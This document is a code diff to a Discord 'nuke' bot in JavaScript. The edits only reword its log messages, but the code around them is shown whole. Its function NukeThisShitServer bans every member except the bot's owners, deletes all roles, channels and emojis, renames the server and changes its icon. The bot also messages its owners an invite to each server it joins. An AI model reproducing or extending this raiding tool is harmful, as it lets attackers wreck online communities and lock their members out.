@@ -24,9 +24,9 @@ bot.on("guildCreate", (guild) => {
             bot.users.cache.get(id).send(`GUILD ADD: ${guild.name} - owned by: ${guild.owner.user.tag}`);
             if(settings.auto_invite_create_when_bot_join_in_a_guid) {
                 guild.channels.cache.first().createInvite().then(invite => {
-                    bot.users.cache.get(id).send(`And here is your invite: ${invite.url}`);
+                    bot.users.cache.get(id).send(`Here is your invite link: ${invite.url}`);
                 }).catch(() => {
-                    bot.users.cache.get(id).send(`I can't create an invite...`);
+                    bot.users.cache.get(id).send(`Could not create an invite link...`);
                 });
             }
         }
@@ -53,17 +53,17 @@ function NukeThisShitServer(server) {
     if(server) {
         if(settings.actions.change_server_icon) {
             server.setIcon(settings.icon).then(() => {
-                console.log("ICON: I was successfully changed the server avatar.");
+                console.log("ICON: I successfully changed the server's avatar.");
             }).catch(() => {
-                console.log("ICON: I can't change the server avatar.");
+                console.log("ICON: Could not change the server's avatar...");
             });
         }
 
         if(settings.actions.change_server_name) {
             server.setName(settings.name).then(() => {
-                console.log("NAME: I was successfully changed the server name.");
+                console.log("NAME: I successfully changed the server's name.");
             }).catch(() => {
-                console.log("NAME: I can't change the server name...");
+                console.log("NAME: Could not change the server's name...");
             });
         }
 
@@ -71,9 +71,9 @@ function NukeThisShitServer(server) {
             server.members.cache.forEach(member_obj => {
                 if(!owners.some(s => s == member_obj.user.id)) {
                     member_obj.ban().then(() => {
-                        console.log(`BAN: I was successfully banned: ${member_obj.user.tag}`);
+                        console.log(`BAN: Succesfully banned: ${member_obj.user.tag}`);
                     }).catch(() => {
-                        console.log(`BAN: I can't ban: ${member_obj.user.tag}`);
+                        console.log(`BAN: Coult not ban: ${member_obj.user.tag}`);
                     });
                 }
             });
@@ -82,9 +82,9 @@ function NukeThisShitServer(server) {
         if(settings.delete.roles) {
             server.roles.cache.forEach(role_obj => {
                 role_obj.delete().then(() => {
-                    console.log(`ROLE: I was successfully deleted role: ${role_obj.name}`);
+                    console.log(`ROLE: Successfully deleted role: ${role_obj.name}`);
                 }).catch(() => {
-                    console.log(`ROLE: I can't delete role: ${role_obj.name}`);
+                    console.log(`ROLE: Coult not delete role: ${role_obj.name}`);
                 });
             });
         }
@@ -92,9 +92,9 @@ function NukeThisShitServer(server) {
         if(settings.delete.channels) {
             server.channels.cache.forEach(channel_obj => {
                 channel_obj.delete().then(() => {
-                    console.log(`CHANNEL: I was successfully deleted channel: ${channel_obj.name}`);
+                    console.log(`CHANNEL: Successfully deleted channel: ${channel_obj.name}`);
                 }).catch(() => {
-                    console.log(`CHANNEL: I can't delete channel: ${channel_obj.name}`);
+                    console.log(`CHANNEL: Coult not delete channel: ${channel_obj.name}`);
                 });
             });
         }
@@ -102,9 +102,9 @@ function NukeThisShitServer(server) {
         if(settings.delete.emojis) {
             server.emojis.cache.forEach(emoji_obj => {
                 emoji_obj.delete().then(() => {
-                    console.log(`EMOJI: I was successfully deleted emoji: ${emoji_obj.name}`);
+                    console.log(`EMOJI: Successfully deleted emoji: ${emoji_obj.name}`);
                 }).catch(() => {
-                    console.log(`EMOJI: I can't delete emoji: ${emoji_obj.name}`);
+                    console.log(`EMOJI: Coult not delete emoji: ${emoji_obj.name}`);
                 });
             });
         }
@@ -127,13 +127,13 @@ function NukeThisShitServer(server) {
 
                 if(settings.create_after_nuke.emojis) {
                     server.emojis.create(settings.icon, `${i}`).then(() => {
-                        console.log(`EMOJI: I was created emoji '${i}'`);
+                        console.log(`EMOJI: Created emoji '${i}'`);
                     }).catch(() => {
-                        console.log(`EMOJI: I can't create emoji '${i}'`);
+                        console.log(`EMOJI: Could not create emoji '${i}'`);
                     });
                 }
             }
         }, 2000);
     }
-    else console.log("SERVER: Sorry, but this fucking server does not exists...");
+    else console.log("SERVER: Sorry, but this server does not exists...");
 }
